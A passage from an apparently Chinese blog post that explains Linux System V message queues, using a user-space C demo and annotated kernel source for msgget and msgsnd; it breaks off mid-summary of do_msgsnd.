<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span>&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;       <span class="comment">/* message type, must be &gt; 0 */</span></span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">128</span>];    <span class="comment">/* message data */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> <span class="title">sendbuf</span>=</span>&#123;<span class="number">888</span>,<span class="string">&quot;this is message from que&quot;</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> <span class="title">readbuf</span>;</span></span><br><span class="line">        <span class="keyword">int</span> msgid= <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">key_t</span> key;</span><br><span class="line">        key = ftok(<span class="string">&quot;.&quot;</span>,<span class="string">&#x27;z&#x27;</span>);<span class="comment">//获取键值</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;key=%x\n&quot;</span>,key);</span><br><span class="line">        msgid=msgget(key,IPC_CREAT|<span class="number">0777</span>);<span class="comment">//在内核中打开或建立键值为key的，权限为0777的消息队列</span></span><br><span class="line">        <span class="keyword">if</span>(msgid == <span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;create msgq failure\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        msgsnd(msgid,&amp;sendbuf,<span class="built_in">strlen</span>(sendbuf.mtext),<span class="number">0</span>);<span class="comment">//往队列id为msgid的队列写入sendbuf(类型为888)数据</span></span><br><span class="line">        msgrcv(msgid,&amp;readbuf,<span class="keyword">sizeof</span>(readbuf.mtext),<span class="number">999</span>,<span class="number">0</span>);<span class="comment">//从队列中获取999类型的数据，如果队列中未出现999类型的数据，则程序阻塞在这里</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,readbuf.mtext);</span><br><span class="line">        msgctl(msgid,IPC_RMID,<span class="literal">NULL</span>);<span class="comment">//将队列从系统内核中删除</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./read </span><br><span class="line">key=<span class="number">7</span>a05274f <span class="comment">/* 获取同一个key */</span></span><br><span class="line">read from que:<span class="keyword">this</span> is message from que </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./send          </span><br><span class="line">key=<span class="number">7</span>a05274f <span class="comment">/* 获取同一个key */</span></span><br><span class="line"><span class="number">888</span> message already received</span><br></pre></td></tr></table></figure>
<ul>
<li>如果只在同一个进程中传递信息，则不提供 key 也可以</li>
</ul>
<p><strong>Linux 中 msg 的实现</strong></p>
<p>创建或打开消息队列 <code>msgget</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ee3019</span> &lt;msgget+<span class="number">9</span>&gt;        syscall  &lt;SYS_msgget&gt;</span><br><span class="line">       key: <span class="number">0x7a05274f</span></span><br><span class="line">       msgflg: <span class="number">0x3ff</span></span><br></pre></td></tr></table></figure>
<ul>
<li>用户态的底层就是一个 syscall</li>
<li>内核态中就是以下这个函数：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_ops</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*getnew)(struct ipc_namespace *, struct ipc_params *);</span><br><span class="line">	<span class="keyword">int</span> (*associate)(struct kern_ipc_perm *, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*more_checks)(struct kern_ipc_perm *, struct ipc_params *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipc_ops</span> <span class="title">msg_ops</span> =</span> &#123;</span><br><span class="line">		.getnew = newque,</span><br><span class="line">		.associate = security_msg_queue_associate,</span><br><span class="line">	&#125;; <span class="comment">/* 初始化&quot;创建例程&quot; */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_params</span> <span class="title">msg_params</span>;</span></span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns; <span class="comment">/* 获取当前IPC命名空间 */</span></span><br><span class="line"></span><br><span class="line">	msg_params.key = key; <span class="comment">/* 键值 */</span></span><br><span class="line">	msg_params.flg = msgflg; <span class="comment">/* 标识符 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ipcget(ns, &amp;msg_ids(ns), &amp;msg_ops, &amp;msg_params); <span class="comment">/* 核心函数 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ipcget</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (params-&gt;key == IPC_PRIVATE) <span class="comment">/* 是否私有 */</span></span><br><span class="line">		<span class="keyword">return</span> ipcget_new(ns, ids, ops, params); <span class="comment">/* 创建一个新的ipc对象 */</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> ipcget_public(ns, ids, ops, params); <span class="comment">/* 获取一个ipc对象或创建一个新对象 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ipcget_new</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// *ns: ipc命名空间</span></span><br><span class="line">    <span class="comment">// *ids: ipc标识符集</span></span><br><span class="line">    <span class="comment">// *ops: 要调用的实际创建例程</span></span><br><span class="line">    <span class="comment">// *params: 它的参数</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	down_write(&amp;ids-&gt;rwsem); <span class="comment">/* 写者申请[得到]读写信号量sem时调用 */</span></span><br><span class="line">	err = ops-&gt;getnew(ns, params); <span class="comment">/* 其实就是执行了&quot;创建例程&quot;中的newque */</span></span><br><span class="line">	up_write(&amp;ids-&gt;rwsem); <span class="comment">/* 写者[释放]读写信号量sem时调用 */</span></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>前面这些可以说是 “共享内存”，“信号量”，“消息队列” 的通用部分，只是 <code>ipc_ops</code> 结构体的初始化不同</li>
<li>其实这里可以看出一点面向对象的思想了</li>
<li>函数 <code>newque</code> 的源码如下：（创建一个新的消息队列）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="comment">// *ns: 命名空间</span></span><br><span class="line">    <span class="comment">// *params: 指向包含key和msgflg的结构体(ipc_params)</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL); <span class="comment">/* 为msg_queue分配内核堆空间 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	</span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm); <span class="comment">/* 将msg_queue添加到消息队列基数树中,并取回基数树id */</span></span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni); <span class="comment">/* 新创建的msg_queue结构挂到msg_ids里面的基数树上 */</span></span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free); <span class="comment">/* 释放目标 */</span></span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>msgget</code> 会在内核堆空间中创建一个 <code>msg_queue</code> 结构体：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>msgsnd</code> 和 <code>msgrcv</code> 都依靠另一个重要的结构体 - <code>msg_msg</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *security;		<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>往消息队列中添加消息 <code>msgsnd</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ee2eb8</span> &lt;msgsnd+<span class="number">24</span>&gt;    syscall  &lt;SYS_msgsnd&gt;</span><br><span class="line">       msqid: <span class="number">0x16</span></span><br><span class="line">       msgp: <span class="number">0x7fffffffddd0</span> ◂— <span class="number">0x378</span></span><br><span class="line">       msgsz: <span class="number">0x18</span></span><br><span class="line">       msgflg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>用户态的底层还是一个 syscall</li>
<li>内核态中就是以下这个函数：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, struct msgbuf __user *msgp, <span class="keyword">size_t</span> msgsz,</span></span></span><br><span class="line"><span class="params"><span class="function">		 <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> mtype;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (get_user(mtype, &amp;msgp-&gt;mtype)) <span class="comment">/* 从用户空间获取单个数据-msg类型 */</span></span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">return</span> do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">long</span> mtype, <span class="keyword">void</span> __user *mtext,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="keyword">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	msg = load_msg(mtext, msgsz); <span class="comment">/* 先调用&quot;alloc_msg(msgsz)&quot;创建一个msg_msg结构体,然后调用&quot;copy_from_user(msg+1,mtext,msgsz)&quot;拷贝用户空间的mtext紧跟msg_msg结构体的后面 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line"></span><br><span class="line">	msg-&gt;m_type = mtype; <span class="comment">/* 写入msg类型 */</span></span><br><span class="line">	msg-&gt;m_ts = msgsz; <span class="comment">/* 写入msg大小 */</span></span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid); <span class="comment">/* 通过msqid从namespace中找到对应的msq-&gt;q_perm结构体,然后调用container_of通过偏移计算得到msg_queue结构体地址 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		err = PTR_ERR(msq);</span><br><span class="line">		<span class="keyword">goto</span> out_unlock1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_sender</span> <span class="title">s</span>;</span> <span class="comment">/* 定义了发送消息链表 */</span></span><br><span class="line"></span><br><span class="line">		err = -EACCES;</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IWUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123; <span class="comment">/* 检查该队列是否被删除 */</span></span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		err = security_msg_queue_msgsnd(&amp;msq-&gt;q_perm, msg, msgflg); <span class="comment">/* 调用一个钩子函数 */</span></span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		<span class="keyword">if</span> (msg_fits_inqueue(msq, msgsz)) <span class="comment">/* 检查消息队列是否满 */</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* queue full, wait: */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123; <span class="comment">/* IPC_NOWAIT:当消息队列已满的时候,msgsnd函数不等待立即返回 */</span></span><br><span class="line">			err = -EAGAIN;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* enqueue the sender and prepare to block */</span></span><br><span class="line">		ss_add(msq, &amp;s, msgsz);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!ipc_rcu_getref(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123; <span class="comment">/* 检查该队列是否被删除 */</span></span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line">		ss_del(&amp;s);</span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123; <span class="comment">/* 仅仅检查一下是否有信号,不处理信号 */</span></span><br><span class="line">			err = -ERESTARTNOHAND;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_update_pid(&amp;msq-&gt;q_lspid, task_tgid(current));</span><br><span class="line">	msq-&gt;q_stime = ktime_get_real_seconds();</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/* 如果有被阻塞的接收进程,且消息满足接收要求,则将消息直接发送给被阻塞的接收进程</span></span><br><span class="line"><span class="comment">    否则,将消息排入消息队列尾 */</span> </span><br><span class="line">	<span class="keyword">if</span> (!pipelined_send(msq, msg, &amp;wake_q)) &#123;</span><br><span class="line">		list_add_tail(&amp;msg-&gt;m_list, &amp;msq-&gt;q_messages); <span class="comment">/* 插入msg_msg链表的尾部 */</span></span><br><span class="line">		msq-&gt;q_cbytes += msgsz;</span><br><span class="line">		msq-&gt;q_qnum++;</span><br><span class="line">		atomic_add(msgsz, &amp;ns-&gt;msg_bytes);</span><br><span class="line">		atomic_inc(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = <span class="number">0</span>;</span><br><span class="line">	msg = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (msg != <span class="literal">NULL</span>)</span><br><span class="line">		free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里总结一下 <code>do_msgsnd</code> 的功能：<ul>
<li>调用 <code>load_msg</code> 创建一个 msg_msg 结构体，把数据拷贝到该 msg_msg 的后面</li>
<li>通过 msqid 计算得到 msg_queue 结构体地址</li>
